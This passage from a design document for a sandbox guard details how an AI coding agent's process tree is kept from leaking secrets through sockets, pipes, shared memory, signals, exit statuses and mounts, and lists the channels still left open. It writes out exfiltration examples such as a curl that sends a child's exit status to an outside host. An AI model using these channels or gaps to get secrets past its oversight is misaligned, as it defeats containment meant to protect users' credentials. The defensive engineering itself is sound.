- *The arbiter learns every flow* (`recordProcessFlow`, on the human
  socket; from the data socket a claim, which only adds taint): every taint
  walk follows it, the model exit's fold included, so a tool call whose
  `curl` received a holder's bytes from a server an earlier call left
  running is masked.

Utility cost: a client of a holder is confined like the holder (`curl
localhost:3000` against a dev server that read `.env` may then connect only
where `.env` may go, and its output is masked). Tests: kernel
`tests/socket_flow_integration.rs`, `taint_gaps_integration.rs`, `pipe_flow`
and `send_guard` units, the arbiter's `process-flow-record.test.ts`, and
`tests/sandbox/guard/socket-flow.test.ts`.

**The agent's own connection to a holder (plan 13 §4.5.1): masked, not
refused.** The agent is never made a holder, so what the agent process
ITSELF received from a holder (an HTTP MCP server that read `.env`, a dev
server fetched with WebFetch) reached the model as a tool result no process
tree folds; and a keep-alive the agent held when the server then read its
secret refused that raw open. Refusing would break the agent's own tools on
any local server; masking keeps them working and keeps the bytes out of the
model. The guard records an AGENT FLOW at the arbiter (`recordAgentFlow`, on
the human socket) and never confines the agent:

- *at the holder's accept* (`guard_flow::accepted_flow`): a client socket the
  agent holds is recorded before the holder gets the connection;
- *at the sweep* (`guard_flow::sweep_agent_channel`): a socket of the new
  holder whose other end the agent holds and that the holder accepted
  (`pipe_flow::agent_channel`: TCP on this machine found in `/proc/net` by
  the two ends, or a Unix connection on the holder's named listener; never a
  socket pair, nor the holder's connection to a server the agent runs, which
  stays an exit) is recorded and not judged as an exit;
- *the close*: the guard's 200 ms look (`observe_agent_closes`) reports a
  channel no agent process holds any more.

A record that fails resets the connection or refuses the raw open
(fail-closed). The model exit (`agentReceiptTaint`, plan 13 §4.5.1) masks a
result the agent itself produced during a call whose window overlaps a flow,
and a WebFetch summarizer side call made while one overlaps. Utility cost:
while a connection to a holder is open, every result of the agent's own
network tools is masked. Tests: kernel `tests/agent_flow_integration.rs`,
`pipe_flow` units, `tests/sandbox/guard/agent-flow.test.ts`.

**A file object shared with a holder (plan 13 §9 R1).** A FILE two processes
share carried the secret past the pipe and socket flows: a reader that
already held a file open when a holder appended to it (`tail -f /tmp/x | curl
… &`), shared memory (a `/dev/shm` file mapped `MAP_SHARED`, a memfd,
anonymous shared memory inherited across a fork, a SysV segment), and an
object with no path to label (an unlinked file, an `O_TMPFILE`, a memfd). The
taint now follows the OBJECT (`object_flow.rs`, pure; the enactment in
`guard_flow.rs`): a process of the tree that can READ an object (a reading
descriptor, or any mapping of it, from `/proc/<pid>/fd`, `fdinfo` and `maps`)
receives what a holder that can WRITE it puts there. An object is keyed by
device and inode (`file:[dev:ino]`) or, for a SysV segment, by IPC namespace
and segment id, and matched by a shared key or the same real path. Judged at
the later of the two events (plan 13 §4.5):

- *at the taint* (`guard_send::sweep_from`): the objects the swept processes
  can write are marked and their readers become holders, swept in turn; a
  mapped file with a path is labelled as a descriptor's is (D5);
- *at a holder's write-capable open of a regular file* (before any `O_TRUNC`
  and before the descriptor is handed over): the processes already reading
  it become holders (`guard_flow::object_written`); one holding an unbound
  connection refuses the WRITE (`EACCES`);
- *at a holder's writable `shmat`* (trapped under a secret policy,
  `guard_flow::handle_ipc_notif`): the segment's other users, the same way;
- *at a pass of a regular file over `SCM_RIGHTS`* (`PassedEnd::File`): the
  receivers read what the sender or a writing holder put there;
- *at a later reading open or `shmat` of a marked object* (the mark is kept
  after the writer exits): an object no label gates makes the opener a holder
  before it gets a byte (`guard_flow::object_open`); the agent, never made a
  holder, is refused such an open. A labelled file is gated by its label
  first;
- *at the later event* of an untainted process: an object it reads that a
  holder marked (`guard_flow::later_flow`).

A reading open racing a holder's write is seen by one side or the other (the
in-flight registry `object_flow::ObjectOpens`; a continued `shmat` stays
registered for two seconds). A message queue has no point the guard could
judge on the reader's side before the bytes arrive, so a holder's `msgsnd`
and `mq_timedsend` are refused (`EACCES`). One a process holding no secret
makes is let go (CONTINUE), and the kernel copies its buffer after that
answer: its process's egress gate stays entered until the sending thread
is seen out of the call (`/proc/<tgid>/task/<tid>/syscall`: another
syscall, none, or the thread gone; `running` does not settle it), so
another thread's raw open, whose taint waits for the gate, returns only
after the copy (2026-10-07, `object_flow::QueueSends`). Cost: a holder's taint and its
write-open of a file read the fd tables and `maps` of the guard's tree (a few
milliseconds), except for a file born less than a second ago that no other
process opened and none was passed. Utility cost: a process that holds open
(or maps) a file a holder writes is confined like the holder; a lock or
database file opened read-write by a holder and others makes those others
holders; a holder cannot use a SysV or POSIX message queue; a raw open
waits while another thread of its process is inside a queue send (blocked
on a full queue, up to the taint's five seconds, then refused). Residuals:
a mapping obtained without a
trapped call from an object a holder created after its taint with no trapped
call either; the agent reading a file at the moment a holder writes it. Tests:
kernel `tests/object_flow_integration.rs` (each shape, with controls),
`object_flow` units, the filter unit test.

**The agent's receipt, its three leftovers (plan 13 §4.5.1).** Closed:

- *Through the session's net-proxy: refused.* A request to an address of
  this machine that `NO_PROXY` does not name is re-originated by the
  net-proxy from outside the tree, so a holder's accept saw a client outside
  the tree. The guard finds the session's net-proxy (the processes holding a
  socket listening at a `proxy_ports` port, `guard_flow::proxy_pids`) and
  resets a holder's accept of a connection the proxy holds
  (`guard_flow::relayed_by_proxy`); the sweep refuses the raw open of a
  server that holds one (`pipe_flow::relayed_channel`). Not masked, because
  the proxy pools upstream connections and no record can name the client. A
  proxy whose process cannot be read refuses every such connection.
- *Where the accept is not trapped (< 5.6): recorded at the connect.* The
  agent's TCP connect to a listener a live holder's tree holds on this
  machine records the agent flow before it continues
  (`guard_flow::agent_connect_flow`), and the sweep records the agent's
  connections waiting in a new holder's backlog. A record that fails refuses
  the connect.
- *A FIFO the agent itself reads: an agent flow*, recorded at the later of a
  holder's write-open and the agent's read-open (or at the sweep), before the
  later descriptor is handed over (`guard_flow::holder_fifo_open`,
  `agent_fifo_open`, `sweep_fifo_writes`; the two looks under one gate,
  `GuardConfig::fifo_gate`). The same for a regular file or mapping the agent
  already reads when a holder writes it (`agent_object_reads`). The model
  exit masks a file tool's result by such a flow only.

**A named pipe, a signal with a payload (plan 13 §4.5.1 and §4.9).**

- *A holder's FIFO, judged before its descriptor is handed over.* The
  write-open marks the FIFO and makes its readers holders, swept, before the
  holder gets its descriptor (`guard_flow::fifo_write_open`; an unbound
  connection one of them holds refuses the write-open), and a reading open of
  a FIFO is listed in flight and checked against the mark
  (`guard_flow::object_open`), which also closes the race of a blocking
  read-open that completes together with the write-open.
- *A reader the agent runs itself.* A file tool that runs a child (Claude
  Code's Grep runs `rg`) on a FIFO or file a holder writes: the child is made
  a holder, but its output reaches the model as the agent's own tool result.
  Every flow that makes a direct child of the agent a holder (a FIFO's or a
  file object's reader) also records an agent flow on a file channel
  (`guard_flow::agent_child_receipt`), so the model exit masks that tool's
  result; a record that fails refuses the event. Not for an anonymous pipe or
  a socket pair: a Bash call's stages and an MCP server's own children are
  folded by their call or server, and an agent flow masks every result in its
  window.
- *A FIFO whose reader is outside the guard's tree.* An `O_WRONLY` open of a
  FIFO completes only once it has a reader; when no process of the tree holds
  it for reading within two seconds (`FIFO_READER_WAIT`; the agent counts as
  present), the reader is a process the guard does not watch, and the
  holder's write-open is refused (`EACCES`).
- *A pipe or socket pair read outside the guard's tree (P0 2b,
  2026-10-09).* The taint-time sweep, after following every swept tree's
  pipes and socket pairs to their receivers in the tree, scans the user's
  processes outside the tree (`pipe_flow::outside_receivers`, the guard
  itself skipped) for the read end of a pipe a swept process can write
  (`pipe:[ino]`), the other end of a socket pair it holds (both ends
  unnamed; the peer by `sock_diag`), or a read end of a FIFO it holds open
  for writing (by identity): one found refuses the raw open (`EACCES`; the
  accept or pass that started a receivers' sweep, likewise). The same look
  refuses a pass that hands a holder an end whose other side is held
  outside (`pass_flows`), and a holder's `sendmsg` with no address on a
  socket pair whose other end is held outside (`prepare`; a clean look kept
  one second per pair end). The guard's own stdio (the human plane the
  launch handed the tree's root) is left out; a table the guard cannot read
  (another user's, a non-dumpable process) is not seen. One scan is about
  11 ms on a host with 1,600 processes.
- *A signal with a payload.* `rt_sigqueueinfo`, `rt_tgsigqueueinfo` and
  `pidfd_send_signal` with a `siginfo` carry eight caller-chosen bytes per
  signal: a holder's to a process that holds no secret is refused (`EPERM`,
  `guard_kernel::payload_signal_refused`); to itself or another holder it
  goes on; by pidfd it is refused whatever the descriptor names.
  `kill` and `tgkill` carry only the signal number and stay a covert channel
  with exit codes and timing (plan 13 §4.9): following them would make the
  receiver of every holder's signal a holder (a shell's job control, a
  supervisor's `SIGTERM`); open (plan 13 §8).

Tests: kernel `tests/fifo_signal_integration.rs`, the filter and
`guard_signals` unit tests.

**A holder's exit status (plan 13 §4.9 and §9 R4).** In `reader | prog; curl
"https://unbound/?b=$?"` the shell reaps `prog` with `wait4` and was no
holder, so about eight bits per process reached any allowed host. The status
reaches the parent by `wait4` / `waitid` and by `SIGCHLD`'s `siginfo`
(delivered at the exit, before any wait), a tracer by its stops, and since
Linux 6.15 any pidfd holder by `ioctl(PIDFD_GET_INFO)`. The rule: the reaper
of ANY holder becomes a holder. Two legs (`wait_flow`, pure; `guard_wait`):

- *At the taint.* `sweep_from` treats every process it makes a holder as a
  writer into its parent and its tracer (`guard_wait::status_receivers`),
  each made a holder and swept the same way, up to the agent's own child,
  before the reader gets a byte.
- *At the wait.* Under a secret policy the filter hands `wait4` and `waitid`
  to the supervisor. A waiter with a holder among the processes it may reap
  is made a holder and swept (`guard_flow::admit_receivers`) BEFORE the guard
  answers `CONTINUE`; the kernel performs the wait itself, so a blocking wait
  blocks in the tracee. A waiter that already holds every source those
  holders carry (`TaintedSet::covers`) continues without a sweep; one whose
  sweep refuses (an unbound connection) is KILLED and the wait not performed
  (answering `ECHILD` instead hung shells and libuv). A reader whose raw open
  was refused, and which held nothing before, is forgotten
  (`TaintedSet::forget`), so it does not taint its shell.
- `ioctl(PIDFD_GET_INFO)` is refused in the filter with `ENOTTY` under a
  secret policy (`guard_filter::pidfd_info_block`), what a kernel before
  6.13 answers.

Never the agent or a process above it: the agent reaps every call's shell,
and what it learns goes to the model through the model exit, where a masked
result carries no status. Utility cost: from a holder child's taint on, the
call's shell is a holder, so its later commands are confined like the holder
and its running background children are swept with it; a process that holds
an unbound connection loses its child's raw open or, for a holder it learned
of later, its life (killed at the wait). Not covered (plan 13 §4.9): when a
holder exits (timing), and a zombie holder's `/proc/<pid>/stat` `exit_code`
read by a process outside its parent's tree. Tests: kernel
`tests/wait_status_integration.rs` (with controls: shells, `make`, Python's
`subprocess` and Node's `child_process` see their children's real statuses),
unit `wait_flow`, `guard_filter`, `secret_open`.

**A subshell that never execs, in the arbiter's tree (plan 13 D7).** The guard
reported one lineage edge per exec and per secret open, so a subshell forked
without an exec (`( cat x; true ) | …`, `echo "$(cat x; true)"`) had no edge,
and the model exit's walk from the call's root (`callTaint`, plan 10 §4.2)
never reached a reader under it. Every exec (`handle_exec_notif`, before the
exec is let go) and every secret open now send the live ancestor chain,
nearest first, stopped below the guard and at init
(`secret_open::lineage_chain_of`, `lineage::chain_continues`):
`recordExecRoot` `ancestors`, `decideSecretOpen` `ancestorKeys`. The arbiter
keeps the FIRST edge of each child (`ProvenanceStore.recordLineage`): a later
report of another parent is a reparenting, and must not cut a reader out of
the tree it started in. A subshell whose first exec or open comes after its
own parent died is linked through its ORPHAN ROOT (`orphanRoot`, sent when
that root was born after the agent; `lineage::orphan_root_report`), whose
tree the arbiter folds into every call relayed no later than it was first
seen (plan 13 §3 D7). Cost: one `/proc` walk per exec. Tests: `lineage.rs`,
`provenance-store.test.ts`, `provenance-ipc.test.ts`,
`tests/sandbox/guard/call-tree.test.ts`.

**The call's root (plan 13 D7).** The exec handler also says whether the
exec'ing process is the agent's own child (`recordExecRoot` `callRoot`): that
exec is the shell the agent runs one tool call in, and the arbiter binds the
call to it by command text (plan 13 §3 D7, `ProvenanceStore.callTree`; when
more same-text calls than recorded shells may own them, none is bound). With
no agent named (`agentExe` empty) no exec is a call root, and the arbiter
masks every shell result while the session holds a raw read. Tests:
`lineage.rs` `a_call_root_is_an_exec_by_the_agents_own_child`, the
`mandu-arbiter` protocol test, `tests/sandbox/guard/call-tree.test.ts`.

**Authenticated reports (plan 13 D9).** Every record above (the chains,
`callRoot`, the raw opens, the protected writes, `flowsFrom`'s writers) would,
on the arbiter's data socket, be forgeable by any process the agent runs (a
false parent for a reader, a fake call shell, a raw open of its own `cat`
reported as a system binary). The guard reports on the arbiter's HUMAN-plane
socket (arbiter-human-plane.md), which the agent world is walled off from by
this guard's own `unixDeny`, the wrap's tmpfs and the Unix allow-list, and the
arbiter believes the records only there; from the data socket each is a claim
that may add taint and never lowers it (`ATTESTED_REPORT_OPS`, plan 13 §3 D9).
The guard asks the data socket's `hello` for the human socket's path and
confirms it with that socket's own `hello` (`channel: human`) before it
serves the first notification (`report_channel::choose`). Its connection is
its own (opened after the fork, close-on-exec) and the guard is not dumpable,
so no process of the agent can borrow it. *Fail-closed:* a guard that finds
no human socket reports on the data socket and says so: the arbiter then
serves every secret open its twin and refuses every protected write. While a
launch with no wall around the human socket is live, the human socket is
believed no more than the data socket (arbiter-human-plane.md §10.1). The
clean box's verdict keeps its own reporter token (§8.5.3). Tests:
`report_channel.rs`, the `mandu-arbiter` `hello` test,
`arbiter/test/component/guard-report-attestation.test.ts`,
`tests/sandbox/guard/forged-reports.test.ts`.

**The exits that are paths (plan 13 §9 R4 (b), 2026-10-03).** A holder's
write-capable open, which the guard performs, is also judged as an exit
(`local_exits.rs`; `guard_kernel::holder_mount_refusal`,
`holder_written_file`): on a network or FUSE mount (the descriptor's
`fstatfs` magic or `mountinfo` type) it is refused unless the holder's
bindings name `mount:<fstype>:<source>`, judged before the create; a
character or block device other than the terminal and the sinks that keep
nothing is refused; a regular file is created with no group or other bits,
or has them stripped before the holder gets it. The taint-time sweep does
the same for what a process already writes when it reads a secret
(`guard_send::held_local_exits`, on a `pidfd_getfd` copy of each writable
descriptor since 2026-10-04, never its `/proc/<pid>/fd` link looked up again:
a reused number named another file). Under a secret policy the mode and
attribute families are trapped with or without a write-protect list, and a
`chmod` or POSIX ACL that would reopen a derived file to others is refused
(`perform_chmod`, `perform_xattr`). A `mount:` binding is never handed to
the host spec parser (`local_exits::is_host_binding`). The display
server's socket needs nothing new: it is a Unix destination. Plan 13 §4.6
and §4.9 record the rules and what they leave. Tests: `local_exits.rs`,
`guard_filter.rs`, kernel `tests/local_exits_integration.rs`.

Three leftovers closed 2026-10-04. A stacking file system (overlayfs,
eCryptfs, shiftfs) is judged by the mount its writes land on: the
`upperdir=` super option (or the source directory) from the mount's
`mountinfo` row, opened in the guard's view and in the tracee's
(`openat2(RESOLVE_IN_ROOT)` under `/proc/<pid>/root`), each judged, any
remote ⇒ remote; an upper found in neither, and aufs, are remote
(`local_exits::stacking`, `Lands`). Since 2026-10-09 (P0 5d) the row is
followed only for a stack whose superblock the guard's own mount namespace
holds, and there the upper must resolve in the guard's own view; a stack
mounted only in a namespace of the tree's own is remote whatever its
`upperdir=` names (`local_exits::stack_known`, `lands_of`, confidentiality
plan 13 §4.6). The whole name family (the delete /
rename and write families, and `mkdirat` / `mkdir`) is trapped under every
secret policy, with or without a write-protect list; for a holder the guard
performs the call on the directory or file it pinned and first judges that
descriptor's mount (`holder_change_refused`, in `judge_change` for every
role, and in `perform_mkdir`, `perform_truncate`, `perform_chmod`,
`perform_xattr`, and a holder's `bind`); a non-holder's `mkdir` is answered
CONTINUE, on the dispatching thread while nobody holds a secret. A
`sendmsg` that passes a descriptor (already performed by the guard,
`guard_rights::judge_pass`) also judges each passed descriptor that can
write (`passed_exit`): a file on a mount that leaves the machine (its
`mount:` destination) or a device other than the terminal and the sinks
that keep nothing; a receiver that holds a secret refuses the send. A
process that holds or has queued such a descriptor when it reads a secret
is refused at the taint-time sweep, as before. A sender in a network
namespace the guard's `sock_diag` cannot see into (the command box's) has
such a pass refused outright. `recvmsg` stays untrapped (the hot path of
every receiver). A refusal by the sweep is named for what it was (a file
on a mount, a device, a file other users read; `held_exit_phrase`), no
longer "hold a connection to". Tests: kernel `local_exits_integration.rs`
(O), (N), (R).

Lookups and read offsets, closed 2026-10-07 (plan 13 §4.6, "refuse raw if
visible"): a raw open the arbiter grants is answered with the twin while
a network or FUSE mount (or an automount point) is visible in the opener's
mount namespace, unbound and not trusted in policy.yaml
`remote_mounts.trust_lookups` (`guard_kernel::raw_withheld_by_visible_mount`,
`visible_mounts.rs`; each namespace's `mountinfo` kept open and read again
only when a `poll` says it changed). The launcher hands the trusted mounts
to the guard (`trustLookups`) and names the visible ones at launch
(`remote-mounts.ts`). Tests: kernel `local_exits_integration.rs` (V).

**Still uncovered** (each with its reason):

- A pipe between two processes outside the guard's tree is not seen. A
  holder's pipe or socket pair whose receiving end is held outside refuses
  the taint (P0 2b, 2026-10-09, above), except the human plane (the
  agent's own stdio, by design); not seen: a receiver outside that joins
  after the look, one whose descriptors the guard cannot read (another
  user's, a non-dumpable process of the user's), and a holder's `write` or
  `send` (not trapped) on a pair whose other end left the tree after the
  sweep. A
  FIFO a holder opens to write (`O_WRONLY` or `O_RDWR`) needs a reader in
  the tree and none outside it (every process of the user's, by the FIFO's
  identity; 2026-10-07): a process outside that opens it later, or a reader
  running as another user beside one in the tree, is not seen.
- **A kernel without `pidfd_getfd` (< 5.6):** sends and accepts are not
  trapped (`FilterTraps::no_sends`). No holder exists there: the guard hands
  a tracee every file it opens with `SECCOMP_ADDFD_FLAG_SEND` (5.14,
  `guard_filter::RAW_OPEN_MIN_KERNEL`), so below 5.14 no process reads a
  secret raw (a build-time assertion pins `SEND_TRAP_MIN_KERNEL <
  RAW_OPEN_MIN_KERNEL`). On 5.14 and later, where `pidfd_getfd` fails at run
  time, the accept and the send answer `EACCES`.
- **The orphan window's clock resolution.** Start times are 10 ms ticks; the
  window admits a one-tick margin, which over-approximates (fail-closed) but
  could in principle miss an orphan born more than a tick after a holder's
  death that was never observed.
- **A taint inherited across `execve`** (dropping it at a clean exec, plan 10
  §11.13) is out of scope.
- **A blocking stream `sendmsg` interrupted by a signal** after the guard
  sent part of it is restarted and sent again from its start; datagrams are
  atomic.
- **Semantics of a send the guard performs**: `MSG_ZEROCOPY` is sent copied;
  `SCM_CREDENTIALS` is refused (EPERM); a receiver with `SO_PASSCRED` sees the
  guard's credentials.
- **Utility, fail-closed by design**: a reader that connects BEFORE it reads
  its key (`ssh` loads `~/.ssh/id_*` after it connects) needs a binding for
  that host; a holder resolves names only through `/etc/hosts` or a resolver
  its bindings name; bindings are TCP (`binding_to_spec`), so UDP to a bound
  host (QUIC) is refused.

Tests of the taint legs: `send_guard.rs`, `guard_filter.rs`,
`accept_guard.rs`, `lineage.rs` and `secret_open.rs` unit tests; kernel
`tests/send_integration.rs` (the 2026-10-01 paths with their controls, the
address-rewrite race, the blocking stream send, the costs) and
`tests/taint_gaps_integration.rs` (gaps (a)–(e), each with its leak oracle
and its control); the sandbox suite `tests/sandbox/launcher/tainted-egress.test.ts`
(`integration.tainted-egress`, `ci.maxSkip 0`), which closes
`network-egress/dns` (test-reorganization.md §11.1) and the fork-orphan gap;
the sandbox suite `tests/sandbox/launcher/holder-accept.test.ts`
(`integration.holder-accept`, 2026-10-18), gap (a) through the real launch:
python3 servers in the agent's tree, a non-holder, a holder of an unbound
file and a holder of a file bound to the other machine's first address
(each holding through its reader's pipe), and "the other machine" in a
second network namespace connecting from either of its two addresses, one
leg at a time with every wait on a mark a process writes. A refused leg
is the client reading no byte and ECONNRESET, met by its `recv` or, when the
guard's reset lands before the client's timed connect returns, by the
connect itself (pipeline 11803; continuous-integration.md §11). Until then only
the kernel test covered gap (a): a node dev-server leg in tainted-egress
was flaky under the peer's load. What the sandbox suite does not reach is
left to the kernel tests: an accept already waiting when the taint lands
(`an_accept_waiting_when_the_taint_lands_is_judged`, a race the kernel test
stages with two threads of one process) and `accept4`'s flags and address
copy-out (`an_untainted_accept_is_unchanged_flags_and_address_included`);
launcher `net-guard.test.ts` and `run.test.ts`.

**The wrap's own pid namespace (2026-09-28).** The whole-agent twin wrap adds
`--unshare-pid --proc /proc` (`secret-twins.ts` `TWIN_WRAP_HARDENING`): the
tree sees and signals only itself, so it cannot kill the arbiter or the
proxies, or read a host process's procfs. The guard runs OUTSIDE that
namespace, and procfs resolves `self` for the opener, so the guard names the
tracee's own entry by the number procfs shows for it (`tracee.rs`
`own_entry_in`, `pick_level`: innermost level first, confirmed by start time).
A `self` reached through a symlink (`/etc/mtab`, `/proc/mounts`, `/proc/net`)
is found by a walk by text (`walk_to_proc_self`), and `self/…` relative to a
procfs descriptor (bwrap after `pivot_root`) is opened beneath that
descriptor. `/proc/<n>/…` and `ptrace(n)` / `process_vm_*(n)` are translated
through the guard's tree (`procfs_targets`, `host_pids_named`; every match
refused if any is tainted where a start time cannot pin one). Who may read
such a target: its own process, or an opener that already carries all of its
taint (confidentiality-plan-10 §4.1). The wrap exists only with the bind
layer: where the guard alone serves the twins (no user namespace, or a
bubblewrap whose AppArmor profile forbids a nested sandbox, as with Ubuntu's
distro bwrap before `mandu setup`), there is no pid namespace and a kill of
the arbiter still fails closed. Side effect: what the agent starts in the
background ends with the session. Tests: fs-supervisor unit
(`walk_to_proc_self`, `pick_level`), net-supervisor unit (`host_pids_named`),
kernel `a_tracee_in_its_own_pid_namespace_reads_its_own_procfs`,
`a_tainted_process_in_its_own_pid_namespace_stays_uninspectable` and
`a_holder_of_another_secret_cannot_read_a_holder`, e2e
`tests/sandbox/wrap-pid-namespace.test.ts`.

**Refused in the filter itself.** The guard's program
(`net-supervisor/src/guard_filter.rs`, pure and unit-tested) refuses, in
EVERY posture: `io_uring_setup` (`EPERM`; an io_uring CONNECT op never
reaches the connect trap); every x32-ABI number (`nr | 0x4000_0000`,
`ENOSYS`, before any comparison, as the command box's two filters and the
fs-supervisor listener do: on a kernel with x32 enabled, `connect | X32`
would otherwise miss every trap); `ioctl(TIOCSTI)` and `ioctl(TIOCLINUX)`
(`EPERM`: the whole-agent wrap keeps the user's terminal, so on a kernel
before 6.2 or with `dev.tty.legacy_tiocsti=1` a program could otherwise type
into the agent's terminal); and `setsockopt(IP_OPTIONS | IPV6_RTHDR |
IPV6_2292RTHDR | IPV6_2292PKTOPTIONS)`. Under a secret policy it also
refuses `pidfd_getfd`, `clone` with `CLONE_PARENT` and `clone3` (gap (d)).
The command box's deny filter refuses the new mount API (`open_tree`,
`fsconfig`, `fsmount`, `fspick`, `mount_setattr`), each needing a capability
the box drops.

**Observability.** Best-effort, off the security path: when the launcher
exports `MANDU_ARBITER_SOCK`, the guard emits a `net_action` event per
noteworthy connect decision (every DENY, plus every ALLOW to a NON-loopback
destination), so the dashboard shows the allowed and denied destinations with
the matched rule. A failed emit is swallowed and never changes the seccomp
answer. `MANDU_NET_GUARD_EVENTS=0` opts out of the events only; every report
and question the guard sends goes as before (arbiter-human-plane.md §5.3:
before 2026-10-17 it dropped the guard's whole arbiter client).

*Whose session.* The guard files every event it emits (a refused connect, a
refused send, a twin served, a held write) under the launch's session, the
id the model proxy files that session's turns under (the
`x-mandu-session-id` header, the launch's scope id), so the session's own
log shows what its guard refused. The launcher sets `MANDU_SESSION_ID` to
it for the guard (`applyNetGuard`, overriding a value an outer launch left
in the environment); a guard without it falls back to `MANDU_SCOPE_ID`,
which every launch puts in the agent's environment, and only a guard run by
hand reaches the sessionless `net-guard` log
(`net_supervisor::events::guard_session_id`). Before 2026-10-07 the
launcher set neither for the guard to read, so a live session's refused
connects landed in the `net-guard` log and its own showed none (oracle:
`tests/sandbox/guard/guard-session-events.test.ts`).

**Tests.** Pure decision + sockaddr decode: `net-supervisor/src/guard.rs`
unit tests. Kernel glue: `tests/guard_integration.rs` (`#[ignore]`, via
`scripts/kernel-tests.sh`): ALLOW supervisor-connects to a real loopback
listener, DENY returns EACCES, AF_UNIX handling under a default-DENY policy,
a nonblocking connect is replicated, and the netns discriminator holds
(`guard_judges_the_socket_netns_not_the_process`, which self-SKIPs where the
tracee cannot make a fresh network namespace), plus
`guard_serves_the_command_box_socket_allowlist` (§4.2). Launcher
plan/degrade: `launcher/test/unit/net-guard.test.ts` and
`launcher/test/component/run.test.ts`. Live e2e oracle:
`launcher/test/net-guard-live.test.sh` (the `kernel` tier, every CI push):
the **IP precision the port-only wrap cannot** give (same port, 127.0.0.2
denied while 127.0.0.1 connects), plus port precision, hostname-rule
resolution, and Unix handling.

### 7.7 exec-box and codex's own sandbox (2026-09-05): OFF by default for codex

Codex runs every tool command inside its own sandbox (seccomp + Landlock,
`workspace-write` for a trusted directory, network off). The exec-box shim's
nested bwrap cannot set up its net namespace in there:

    bwrap: loopback: Failed to create NETLINK_ROUTE socket

so every boxed command failed. Codex's sandbox already provides the
AgentShell's containment for those commands (net off, filesystem confined to
the workspace), so the launcher leaves the exec-box OFF for target codex by
default, says so in the banner, and `--exec-box` forces it (a
`danger-full-access` codex has no sandbox of its own). The differential
harness's codex lane runs codex's DEFAULT sandbox posture and asserts
tool-OUTCOME parity across sides (differential-interactive.md §16).

## 8. Exec-output trust — classify Bash stdout by its *measured* influence set

> **Frozen with the integrity axis (2026-09-28).** This whole section is
> integrity-only: with the integrity axis off nothing is masked as untrusted,
> so there is nothing to upgrade. Built: rung 1 (exact match, §8.4) and rung 2
> (the clean box, §8.5), with the verdict reported only by the session guard
> (§8.5.3). Rung 3 (observed read-set) is design only (§8.6). The deny-side
> sibling, the provenance gate, is built (§8.7a, §8.7.1).
>
> Companion to `fs-provenance.md` (the taint registry: `file_taint`,
> `process_taint`, lineage, orphan-fail-closed) and
> `arbiter/policy/claude-code-inbound.ts` / `arbiter/policy/exec-inbound.ts`
> (the blanket `Bash → UNTRUSTED` rule and its per-command opt-in refinement).

### 8.1 The question this answers

The user asks the agent to run `echo mandu-live-ok`; the command string comes
verbatim from the trusted user prompt; the output is that same trusted
literal. Yet the tool_result is classified UNTRUSTED and symbolized
(`claude-code-inbound.ts` `Bash: { schema: "UNTRUSTED" }`).

**In principle** "all influencing inputs trusted → output trusted" is sound:
trust is provenance, not content. **In practice** the inbound classifier
cannot decide it, because it observes the execve boundary (command in, stdout
out), not the dataflow inside the process. The command string is only the
*program*; the invocation's influence set also contains every file it reads,
its environment, shell expansion inside bash (`$(cat f)` looks identical to a
literal at the boundary), and whatever binary `echo` resolves to. So the
channel rule stands in for the unobservable influence set: fail-closed, at a
pure utility cost. This section records how the influence set can be **made
observable** (or enforceable), so the classifier can *upgrade* specific exec
outputs to TRUSTED.

### 8.2 What already exists

- **Network influence.** In AgentShell egress is denied outright (Landlock
  net / `--net-guard` / box net-off), so that input channel is provably
  empty. HumanShell commands never qualify (net-enabled ⇒ influence set
  unbounded).
- **Per-file trust verdicts.** The fs-provenance taint registry (`file_taint`
  keyed by content hash + path, `path_policy ∪ file_taint` consumption,
  **orphan/unknown ⇒ fail-closed UNTRUSTED**) is the verdict store a read-set
  is judged against.
- **Invocation identity + correlation.** Proc-key attribution (`/proc`
  baseline), exec lineage edges, and the proxy↔OS exec correlation
  (`exec-decision-store.ts`) key a runtime verdict back to the `tool_use`
  callId.
- **Refinement hooks.** `exec-inbound.ts` per-command stdout schemas (operator
  opt-in via YAML `inbound.command`): the *syntactic* rung.

What is missing is a sound per-invocation guarantee of *which files the
command read*, plus the plumbing to consume it at classification time (§8.5).

### 8.3 Can we observe what bash read? — the mechanism space (non-root only)

Under the non-root principle (`privilege-model.md` §0). The box contents are
adversarial (agent-authored commands may be attacker-steered), so an
*upgrade* needs race-free evidence; a mechanism an in-box payload can bypass
or race is observability-grade, not upgrade-grade.

- **Family A — enforce-clean (deny-unverified).** Build the box so the *only
  readable paths* carry affirmative TRUSTED verdicts: a Landlock read-allow
  ruleset (or a mount view) from system paths plus registry-verified trusted
  files. A command that completes inside it with net off has a trusted
  influence set **by construction**. LSM checks are at-use, so no TOCTOU;
  zero per-open overhead; reuses the `--exec-box` + Landlock machinery. *Cost:*
  utility, not soundness: a command that needs an unverified file fails in
  the clean box and is rerun un-upgraded (output UNTRUSTED). Verdict TOCTOU
  (a file relabeled mid-run) is closed by resolving verdicts to content
  hashes at ruleset-build time.
- **Family B — observe-complete (record-verify).** Intercept the open family
  with **seccomp-unotify + SECCOMP_ADDFD supervisor-open**: the supervisor
  resolves the path itself, records it, opens it, and injects the fd, so
  check and use are the same act (the pattern `--net-guard` uses for
  `connect(2)`). `execve` targets are confined via Landlock to trusted binary
  paths (enforce, don't record: `CONTINUE` on execve is race-prone and must
  not carry an upgrade decision). *Cost:* every open round-trips through the
  supervisor, and it is real engineering. *Gain over A:* nothing fails; the
  record decides afterwards whether the output upgrades.
- **Rejected for upgrade purposes:** LD_PRELOAD interposition (static
  binaries and raw syscalls bypass it); `/proc/<pid>/fd` sampling (races
  short-lived opens); fanotify, eBPF, auditd (need CAP_SYS_ADMIN / CAP_BPF /
  root); ptrace (heavyweight, breaks ptrace-using tools, superseded by
  unotify + ADDFD).

### 8.4 The upgrade ladder (cheapest first)

0. **Per-command schema opt-in** (`exec-inbound.ts`, ships EMPTY): an operator
   hand-audits specific commands' stdout. Syntactic; parser-mismatch risk is
   why it is never a built-in grant.
1. **Exact-match (echo-back) rule — built.** Classify a tool_result span
   TRUSTED when its bytes already appear verbatim in trusted context (the
   model has already seen them, so nothing new can be smuggled). The
   model-API proxy, the only component holding the conversation, MEASURES the
   fact and sends it as `ClassifyRequest.verbatimInTrustedContext`
   (rewrite-request.ts `buildTrustedContextHaystack`: system + user/assistant
   text + tool_use args, NEVER tool_result bodies, so an upgrade can never
   reveal a new byte); the arbiter DECIDES (claude-code-inbound.ts
   `classifyExactContextEcho`: upgrade-only on an UNTRUSTED base verdict,
   Bash/BashOutput only, whole span only, a 16-char floor on the
   one-newline-stripped candidate). *Whole-span contiguous match only*
   (fragment matching would let an injection be COMPOSED from trusted
